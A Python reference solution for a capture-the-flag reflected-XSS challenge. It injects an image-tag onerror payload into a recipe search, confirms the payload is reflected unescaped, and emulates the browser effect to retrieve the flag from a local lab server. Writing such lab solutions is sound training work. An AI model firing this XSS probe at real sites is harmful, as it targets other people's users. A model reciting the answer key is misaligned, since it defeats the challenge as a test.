#!/usr/bin/env python3
"""Reference exploit for xss1 (reflected XSS in the recipe search).

1. Prove the query is reflected unescaped.
2. The payload <img src=x onerror=grant()> runs grant(), which sets the
   xss_grant_xss1 cookie and follows to /flag. The script emulates that browser
   effect: set the cookie, then fetch /flag.

    python solve.py                 # localhost:8021
    python solve.py http://host:8021
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8021")
PAYLOAD = "<img src=x onerror=grant()>"


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)

    r = s.get(f"{BASE}/", params={"q": PAYLOAD}, timeout=5)
    if PAYLOAD not in r.text:
        sys.stderr.write("payload not reflected -- challenge changed?\n")
        return 1

    # grant() ran in the victim's browser: the cookie now exists.
    s.cookies.set("xss_grant_xss1", "1")
    r = s.get(f"{BASE}/flag", timeout=5)
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag: {r.status_code}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
